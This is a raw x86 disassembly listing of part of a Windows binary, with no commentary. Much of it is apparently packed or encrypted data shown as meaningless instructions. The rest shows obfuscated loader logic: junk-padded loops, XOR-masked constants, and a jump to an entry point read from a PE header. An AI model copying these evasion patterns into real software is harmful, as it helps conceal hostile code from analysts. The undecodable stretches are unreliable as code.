  4111ca:	push   edx
  4111cb:	dec    ecx
  4111cc:	or     al,0xd0
  4111ce:	repnz (bad) 
  4111d0:	fidiv  DWORD PTR ds:0xbb76617a
  4111d6:	ret    
  4111d7:	xchg   edi,eax
  4111d8:	fs jae 0x4111e1
  4111db:	xor    al,ah
  4111dd:	jae    0x411212
  4111df:	das    
  4111e0:	inc    edx
  4111e1:	mov    ds:0x3fbf1ec,al
  4111e6:	cwde   
  4111e7:	cmp    dh,0x8c
  4111ea:	push   cs
  4111eb:	shl    BYTE PTR [edx+0x54c226fa],cl
  4111f1:	ret    
  4111f2:	shr    DWORD PTR [edi],0x96
  4111f5:	mov    eax,ds:0x67800622
  4111fa:	popa   
  4111fb:	xor    eax,0x5477619e
  411200:	sbb    eax,0x3dcb1d47
  411205:	iret   
  411206:	xchg   ebp,eax
  411207:	mov    ebx,0xf64f4505
  41120c:	inc    ebp
  41120d:	mov    WORD PTR [edx+0x16],es
  411210:	add    al,0x74
  411212:	push   eax
  411213:	mov    BYTE PTR [esp+edi*4],al
  411216:	dec    edi
  411217:	adc    BYTE PTR [eax],ch
  411219:	leave  
  41121a:	(bad)  
  41121b:	push   ss
  41121c:	outs   dx,BYTE PTR ds:[esi]
  41121d:	jae    0x411265
  41121f:	and    BYTE PTR [ebp+ebx*1-0x5e],ah
  411223:	in     eax,0x8d
  411225:	inc    ebx
  411226:	mov    ebp,0x62892d25
  41122b:	sub    BYTE PTR [edi+0x49d5696d],bl
  411231:	pop    ebx
  411232:	jecxz  0x411202
  411234:	push   es
  411235:	inc    esi
  411236:	mov    edi,0x1bc95320
  41123b:	mov    WORD PTR [ecx+eax*8+0x178dfd45],?
  411242:	adc    BYTE PTR [eax-0xe],dl
  411245:	mov    al,ds:0xb9b92550
  41124a:	rcl    ch,1
  41124c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41124d:	pop    edx
  41124e:	cmp    BYTE PTR [edi+ebp*4],bl
  411251:	fisub  WORD PTR [esi]
  411253:	add    ah,cl
  411255:	sar    al,1
  411257:	mov    esp,0x98ba3992
  41125c:	(bad)  
  41125d:	cmp    eax,ebx
  41125f:	(bad)  
  411260:	cmp    eax,0x61ee93a
  411265:	or     WORD PTR [ebx+0x69cb8001],si
  41126c:	or     DWORD PTR ds:0x58bc2f13,0xbc1bfae3
  411276:	sbb    BYTE PTR [eax],cl
  411278:	lock call 0x8fe8:0x3b163cc
  411280:	cli    
  411281:	push   0xffffff96
  411283:	xchg   ecx,eax
  411284:	sbb    ebx,edi
  411286:	jl     0x4112bd
  411288:	nop
  411289:	mov    ds:0xfa45bc5e,al
  41128e:	mov    eax,ds:0x664da977
  411293:	fst    DWORD PTR [edi]
  411295:	aaa    
  411296:	mov    eax,0x8d128861
  41129b:	dec    esp
  41129c:	data16 cmp ah,BYTE PTR [edi-0x525d6ea7]
  4112a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112a4:	dec    ebp
  4112a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a6:	lods   al,BYTE PTR ds:[esi]
  4112a7:	into   
  4112a8:	mov    eax,ds:0xdb4d9289
  4112ad:	stc    
  4112ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112af:	test   DWORD PTR [eax+0xc2f1a15],ecx
  4112b5:	add    BYTE PTR [ebx-0x17],bl
  4112b8:	aam    0xfc
  4112ba:	push   es
  4112bb:	ss xor al,0x8
  4112be:	jle    0x4112cc
  4112c0:	mov    dh,BYTE PTR [esi+eiz*2]
  4112c3:	push   edi
  4112c4:	test   BYTE PTR ds:0x4025041b,dh
  4112ca:	sbb    eax,DWORD PTR [ecx-0x7d]
  4112cd:	(bad)  
  4112ce:	jge    0x41127d
  4112d0:	bound  ecx,QWORD PTR [esi]
  4112d2:	sub    eax,0x8f76fe05
  4112d7:	add    BYTE PTR [eax],0xa3
  4112da:	mov    dh,0x46
  4112dc:	add    eax,0xdb5fbde9
  4112e1:	(bad)  
  4112e3:	dec    ecx
  4112e4:	add    eax,0x934895c9
  4112e9:	xor    esi,eax
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434703
  411346:	xor    DWORD PTR ds:0x4346cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4345ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4345ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4345ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43487a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4345ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4345ff
  411399:	dec    eax
  41139a:	mov    ds:0x4345ff,eax
  41139f:	mov    eax,ds:0x4345ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4345ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4345ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434643,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434643
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434643,eax
  4113d6:	cmp    DWORD PTR ds:0x434643,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434643,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43467f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434643,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434643
  411418:	inc    eax
  411419:	mov    ds:0x434643,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43470f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43470f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43470f,ebx
  411442:	cmp    DWORD PTR ds:0x43470f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434693
  411457:	push   0x4347db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43470f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43470f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43470f,ebx
  41147c:	cmp    DWORD PTR ds:0x43470f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4345df
  411490:	adc    DWORD PTR ds:0x4346c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434683,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434703,0x4345e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4346d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4346f7,0x4345f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4346cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4345ff,0x43463f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434713,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4345ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4345ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4345ff,edi
  411509:	cmp    DWORD PTR ds:0x4345ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434707
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4345ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4345ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4345ff,edi
  411545:	cmp    DWORD PTR ds:0x4345ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4345e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4345f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4345f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4345f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4345f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4345f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4345f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4345f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4345f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4345eb
  4115c4:	adc    DWORD PTR ds:0x4345e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43470b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43470b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43470b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43470b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43470b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43470b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43470b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43470b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4115df
  411641:	repnz mov al,0x69
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4115db
  41164d:	ror    edi,cl
  41164f:	in     al,dx
  411650:	dec    ebp
  411651:	retf   
  411652:	pop    ebp
  411653:	ss repnz push eax
  411656:	paddusb mm4,QWORD PTR [esi]
  411659:	and    eax,0xc5751c84
  41165e:	sbb    edx,edx
  411660:	je     0x4115fd
  411662:	inc    ebp
  411663:	mov    eax,ds:0x8a8df0c8
  411668:	or     BYTE PTR [ecx-0x74],bl
  41166b:	sbb    BYTE PTR [edi+0x16],cl
  41166e:	pop    eax
  41166f:	sub    ecx,ebp
  411671:	cmp    BYTE PTR [esi],dl
  411673:	sub    ebx,DWORD PTR [ecx]
  411675:	cmp    BYTE PTR [eax],dl
  411677:	mov    bl,0x8e
  411679:	mov    eax,ds:0xb23bec06
  41167e:	and    esp,DWORD PTR [eax+0x3ac890fd]
  411684:	ins    DWORD PTR es:[edi],dx
  411685:	xor    BYTE PTR [eax+0x57],dh
  411688:	mov    BYTE PTR [eax+eax*1+0x1ee8b67b],bh
  41168f:	sub    dl,BYTE PTR [esi]
  411691:	push   esp
  411692:	into   
  411693:	cwde   
  411694:	push   ss
  411695:	cmc    
  411696:	je     0x411701
  411698:	and    DWORD PTR [edi-0x4393ecde],edx
  41169e:	repnz inc esp
  4116a0:	adc    eax,0x12c8fd14
  4116a5:	bound  eax,QWORD PTR [esi-0x56]
  4116a8:	or     ebx,DWORD PTR [ebp+0x7d99e878]
  4116ae:	repnz or eax,0x5ede87f3
  4116b4:	sbb    al,0xa3
  4116b6:	add    al,0xc2
  4116b8:	inc    ebx
  4116b9:	sub    al,0x87
  4116bb:	push   ds
  4116bc:	and    ebx,DWORD PTR [esi-0x4b]
  4116bf:	ffreep st(4)
  4116c1:	dec    esi
  4116c2:	xor    eax,0x9f7b71a
  4116c7:	jle    0x4116de
  4116c9:	mov    bl,BYTE PTR [edi]
  4116cb:	dec    esi
  4116cc:	lds    edx,FWORD PTR [edi+0x500cace6]
  4116d2:	fcompp 
  4116d4:	test   eax,0xf1e4b3cc
  4116d9:	inc    eax
  4116da:	(bad)  
  4116db:	jmp    0x7a51be50
  4116e0:	xor    BYTE PTR [ebx-0x14],bl
  4116e3:	or     DWORD PTR [ecx-0x4ee61734],ebx
  4116e9:	(bad)  
  4116ea:	jmp    0x411761
  4116ec:	mov    ds:0xb72a56d9,eax
  4116f1:	into   
  4116f2:	adc    edx,DWORD PTR [eax+eax*2+0x1f70de6f]
  4116f9:	dec    edi
  4116fa:	cdq    
  4116fb:	out    0xb9,eax
  4116fd:	test   DWORD PTR [esp+edi*4-0x80],edi
  411701:	mov    esi,0xaf07dc65
  411706:	inc    edx
  411707:	fs div cl
  41170a:	arpl   ax,bx
  41170c:	and    ch,BYTE PTR ds:0x7c8fc9cd
  411712:	sub    BYTE PTR [edx-0x14],0x9
  411716:	push   esi
  411717:	mov    ss,WORD PTR [eax+0xf44f9fc]
  41171d:	sbb    al,0xe3
  41171f:	push   eax
  411720:	jmp    0x411754
  411722:	dec    edx
  411723:	mov    esp,0xa65c17c3
  411728:	shl    BYTE PTR [ecx],cl
  41172a:	ja     0x4116c9
  41172c:	mov    eax,0x7c5f52fb
  411731:	jg     0x411793
  411733:	inc    esi
  411734:	jnp    0x4116c3
  411736:	mov    eax,ds:0x811982d9
  41173b:	dec    esi
  41173c:	push   ss
  41173d:	outs   dx,DWORD PTR ds:[esi]
  41173e:	xchg   BYTE PTR [edi+eax*8+0x2fcf315e],ch
  411745:	stc    
  411746:	push   ebx
  411747:	fadd   DWORD PTR [ebp-0x3cfcabae]
  41174d:	lds    edx,FWORD PTR [eax-0x2b580ebe]
  411753:	jns    0x4117d0
  411755:	pop    ebx
  411756:	mov    esi,0x1b932ec2
  41175b:	or     ch,BYTE PTR [ebx-0x6e]
  41175e:	xor    DWORD PTR [esi-0x462562aa],ecx
  411764:	push   ebx
  411765:	inc    edi
  411766:	pop    es
  411767:	call   FWORD PTR [eax+0x6a]
  41176a:	hlt    
  41176b:	or     BYTE PTR [ecx+0x7b],ch
  41176e:	push   edi
  41176f:	clc    
  411770:	stc    
  411771:	repz and ch,bh
  411774:	sbb    BYTE PTR [ecx],ch
  411776:	push   edx
  411777:	dec    ecx
  411778:	bound  edx,QWORD PTR [ebx]
  41177a:	sbb    eax,0xec068d7
  41177f:	cs cmp al,0x94
  411782:	jge    0x4117d8
  411784:	push   ds
  411785:	or     al,0x15
  411787:	test   ah,0x12
  41178a:	shl    DWORD PTR [ebx],0xcf
  41178d:	fstp   QWORD PTR [eax-0x601cbf64]
  411793:	push   0x9595dc86
  411798:	mov    ebx,0x5daa2277
  41179d:	mov    ebx,ebp
  41179f:	mov    es,WORD PTR [eax+0x56b4fdfe]
  4117a5:	and    eax,0xf0273a00
  4117aa:	lds    ecx,FWORD PTR [ecx+edx*2]
  4117ad:	xor    al,bh
  4117af:	push   eax
  4117b0:	jmp    0x4117fe
  4117b2:	std    
  4117b3:	test   BYTE PTR [esi+0x2d],bl
  4117b6:	fbstp  TBYTE PTR [esi]
  4117b8:	xor    BYTE PTR [esi-0x5b],bl
  4117bb:	xor    edi,DWORD PTR [ebx]
  4117bd:	inc    esp
  4117be:	inc    edi
  4117bf:	xchg   edi,eax
  4117c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117c1:	lea    edi,[esi-0x42]
  4117c4:	in     eax,0x34
  4117c6:	mov    dh,0x9
  4117c8:	jg     0x41176b
  4117ca:	xor    eax,0x53fb6516
  4117cf:	aas    
  4117d0:	call   0x4f10:0x74b55e45
  4117d7:	pushf  
  4117d8:	mov    edi,0x7d5b0b5c
  4117dd:	jg     0x4117b9
  4117df:	jg     0x4117c9
  4117e1:	es push edx
  4117e3:	lds    eax,FWORD PTR ds:0xd5ab5d84
  4117e9:	cmc    
  4117ea:	(bad)  
  4117eb:	cdq    
  4117ec:	xchg   esp,eax
  4117ed:	aaa    
  4117ee:	or     ah,BYTE PTR [ebx-0x503e2033]
  4117f4:	push   edi
  4117f5:	dec    edi
  4117f6:	stos   DWORD PTR es:[edi],eax
  4117f7:	int3   
  4117f8:	mov    dl,BYTE PTR [eax+0x4]
  4117fb:	ficom  DWORD PTR [ebx-0x1c]
  4117fe:	mov    ecx,DWORD PTR [ecx+0x11]
  411801:	scas   al,BYTE PTR es:[edi]
  411802:	jae    0x411881
  411804:	jl     0x411885
  411806:	mov    esi,0xb9d666b9
  41180b:	mov    DWORD PTR [ebp-0x62b2c603],ecx
  411811:	xchg   esi,eax
  411812:	push   edx
  411813:	pop    esp
  411814:	dec    ebx
  411815:	sbb    BYTE PTR [ebx-0x71bc6c94],al
  41181b:	add    BYTE PTR [esp+esi*8+0x66],0x67
  411820:	jnp    0x411856
  411822:	mov    esi,0xa67bb00e
  411827:	fwait
  411828:	mov    WORD PTR [ebp+0x487b4c41],fs
  41182e:	jbe    0x4117ee
  411830:	jns    0x4118aa
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	test   al,0x6f
  411852:	pop    ss
  411853:	mov    ch,0xea
  411855:	push   esp
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x4118bb
  41185d:	and    ch,ah
  41185f:	int    0xb4
  411861:	(bad)  
  411862:	scas   eax,DWORD PTR es:[edi]
  411863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411864:	mov    edi,ss
  411866:	sar    BYTE PTR ds:0x8df6ccc7,1
  41186c:	lods   al,BYTE PTR ds:[esi]
  41186d:	cmp    ebp,ebp
  41186f:	mov    ah,0xb0
  411871:	sub    DWORD PTR [ebx],esi
  411873:	or     dl,BYTE PTR [esi-0x678f69d0]
  411879:	or     eax,0xda5b39b9
  41187e:	push   esi
  41187f:	inc    esp
  411880:	jno    0x4118b0
  411882:	and    al,0x22
  411884:	jp     0x411879
  411886:	jae    0x41188d
  411888:	fstp   TBYTE PTR [ebx-0x5e2450b3]
  41188e:	push   edi
  41188f:	mov    bh,0x9b
  411891:	mov    cs,WORD PTR [esi-0x16]
  411894:	dec    eax
  411895:	pop    ecx
  411896:	std    
  411897:	sbb    dl,BYTE PTR [ebp-0x75]
  41189a:	dec    esi
  41189b:	xlat   BYTE PTR ds:[ebx]
  41189c:	test   bh,dl
  41189e:	int    0x83
  4118a0:	aam    0x57
  4118a2:	add    edi,esi
  4118a4:	(bad)  
  4118a5:	jecxz  0x411832
  4118a7:	mul    DWORD PTR [eax]
  4118a9:	fisttp DWORD PTR [esp+edx*4+0x41]
  4118ad:	(bad)  
  4118ae:	push   ebp
  4118af:	jne    0x411898
  4118b1:	and    edi,DWORD PTR [edx]
  4118b3:	popf   
  4118b4:	mov    ah,0xae
  4118b6:	dec    eax
  4118b7:	loope  0x4118b8
  4118b9:	mov    bh,BYTE PTR [ebx]
  4118bb:	iret   
  4118bc:	dec    ebp
  4118bd:	or     bh,BYTE PTR [eax+0x4]
  4118c0:	leave  
  4118c1:	in     al,dx
  4118c2:	enter  0x7ad0,0x80
  4118c6:	gs inc edi
  4118c8:	paddsb mm2,mm2
  4118cb:	xchg   DWORD PTR [ecx],esi
  4118cd:	mov    edi,0x8bcfbbca
  4118d2:	sbb    ah,0xc7
  4118d5:	push   edi
  4118d6:	xchg   ecx,eax
  4118d7:	xor    bl,bh
  4118d9:	in     eax,dx
  4118da:	cmp    edx,ebx
  4118dc:	xor    BYTE PTR [edi+0x619f92de],cl
  4118e2:	dec    ecx
  4118e3:	outs   dx,DWORD PTR ds:[esi]
  4118e4:	mov    DWORD PTR [ebx],esp
  4118e6:	and    cl,bh
  4118e8:	cli    
  4118e9:	xor    BYTE PTR [eax+esi*4+0x2d4d6355],dh
  4118f0:	mov    cl,0xd6
  4118f2:	rcl    BYTE PTR [ebx],1
  4118f4:	pop    eax
  4118f5:	outs   dx,DWORD PTR ds:[esi]
  4118f6:	pop    esp
  4118f7:	fistp  WORD PTR [edi]
  4118f9:	or     BYTE PTR [ebx],al
  4118fb:	push   cs
  4118fc:	clc    
  4118fd:	daa    
  4118fe:	popa   
  4118ff:	js     0x411921
  411901:	adc    eax,0xf44d4216
  411906:	sbb    ebx,DWORD PTR [ebx]
  411908:	adc    ch,BYTE PTR [eax+0x75792e58]
  41190e:	adc    cl,BYTE PTR [ecx-0x66]
  411911:	mov    dl,0x36
  411913:	pushf  
  411914:	xchg   edi,eax
  411915:	sub    ebx,ebx
  411917:	lock shl BYTE PTR [ecx],cl
  41191a:	in     al,dx
  41191b:	les    ebp,FWORD PTR [eax]
  41191d:	xor    eax,0x71ac0c1f
  411922:	dec    esi
  411923:	sbb    esi,DWORD PTR [edi-0x3f6896f4]
  411929:	fcomp  DWORD PTR [edi]
  41192b:	rcr    DWORD PTR [ebx-0x161c5bde],0x7c
  411932:	sahf   
  411933:	add    DWORD PTR [ebx],edi
  411935:	and    edi,DWORD PTR ds:0x13683077
  41193b:	test   DWORD PTR [ebx+ebx*1+0x1a],ebx
  41193f:	adc    eax,0x52ebfc97
  411944:	repnz sti 
  411946:	scas   al,BYTE PTR es:[edi]
  411947:	(bad)  
  411949:	mov    cl,0xf0
  41194b:	ja     0x411911
  41194d:	jecxz  0x411995
  41194f:	fstp   DWORD PTR [ebp-0x2b]
  411952:	push   edx
  411953:	int3   
  411954:	push   ds
  411955:	dec    ecx
  411956:	jae    0x411927
  411958:	jge    0x4119c3
  41195a:	in     eax,dx
  41195b:	mov    eax,es
  41195d:	adc    edx,DWORD PTR [ebx+0x1f]
  411960:	lea    ebx,[eax-0x539e202f]
  411966:	jg     0x411914
  411968:	dec    ecx
  411969:	push   0x287e22d2
  41196e:	add    ebp,esi
  411970:	sub    al,bh
  411972:	add    al,0x75
  411974:	ret    0xa579
  411977:	jne    0x4119c5
  411979:	or     al,0xa4
  41197b:	inc    esi
  41197c:	add    BYTE PTR [edi+0x74ddfb2a],dh
  411982:	int3   
  411983:	inc    edi
  411984:	mov    cs,WORD PTR [ecx+0x64]
  411987:	ss gs (bad) 
  41198a:	sub    esp,ebp
  41198c:	pop    eax
  41198d:	rol    BYTE PTR [ebp+0x1ef9e9b0],0x6d
  411994:	add    dl,BYTE PTR [ecx]
  411996:	movhlps xmm4,xmm5
  411999:	add    ebp,DWORD PTR [edx+0xd]
  41199c:	mov    dh,0xb7
  41199e:	push   edi
  41199f:	(bad)  
  4119a1:	dec    esp
  4119a2:	xchg   esp,eax
  4119a3:	xchg   DWORD PTR [ebx],eax
  4119a5:	add    al,0xab
  4119a7:	jo     0x411985
  4119a9:	adc    al,BYTE PTR [eax]
  4119ab:	cdq    
  4119ac:	std    
  4119ad:	fisub  DWORD PTR [edi-0x4e]
  4119b0:	in     eax,0x2c
  4119b2:	sub    cl,al
  4119b4:	xlat   BYTE PTR ds:[ebx]
  4119b5:	cld    
  4119b6:	pop    ecx
  4119b7:	test   DWORD PTR [esi+edi*4],ebp
  4119ba:	sbb    DWORD PTR [eax],edx
  4119bc:	mov    eax,0x953ad0fe
  4119c1:	ret    0x679f
  4119c4:	out    0x42,al
  4119c6:	bound  ebx,QWORD PTR [edx+0x69]
  4119c9:	mov    ah,0xf7
  4119cb:	addr16 or al,0xbe
  4119ce:	push   0x69
  4119d0:	cmp    eax,0x8fb154e8
  4119d5:	cs mov ebp,fs
  4119d8:	imul   esp,DWORD PTR [edx-0x68],0xd06bcabd
  4119df:	jle    0x41196e
  4119e1:	repnz mov ecx,0xe99138be
  4119e7:	jge    0x4119e0
  4119e9:	mov    eax,0xbdcc62d6
  4119ee:	mov    al,ds:0x3bc9ba67
  4119f4:	in     al,dx
  4119f5:	ja     0x4119fb
  4119f7:	rcr    BYTE PTR [esi+0x70],cl
  4119fa:	inc    eax
  4119fb:	push   ebp
  4119fc:	ins    DWORD PTR es:[edi],dx
  4119fd:	xor    ecx,DWORD PTR [eax+0x3e]
  411a00:	adc    edx,DWORD PTR [esi+0x3eb4a366]
  411a06:	mov    ch,0x50
  411a08:	xor    BYTE PTR ds:[esi],bh
  411a0b:	mov    ds:0x906236db,eax
  411a10:	sub    eax,0xe12778e6
  411a15:	sbb    eax,0x633f0338
  411a1a:	ja     0x411a6a
  411a1c:	(bad)  
  411a1d:	push   cs
  411a1e:	pop    ds
  411a1f:	push   ds
  411a20:	sub    DWORD PTR [edi],ecx
  411a22:	adc    al,ch
  411a24:	pop    ebp
  411a25:	xlat   BYTE PTR ds:[ebx]
  411a26:	dec    DWORD PTR ss:[edx+0x72]
  411a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a2b:	loopne 0x4119f3
  411a2d:	sahf   
  411a2e:	aad    0xae
  411a30:	jecxz  0x411a1d
  411a32:	scas   eax,DWORD PTR es:[edi]
  411a33:	jg     0x411a72
  411a35:	es ret 0x4704
  411a39:	xchg   esp,eax
  411a3a:	out    dx,al
  411a3b:	xchg   DWORD PTR [eax-0x31786c79],ebx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434677
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4345f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4346cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4346cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434637,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4345ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4345eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434653,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4346c3,0x43467b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434713,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4345f3,0x4345e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43470f,0x4346cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43464f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4346b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4346b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4346b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4346b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4346b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4346b7,0x434677
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
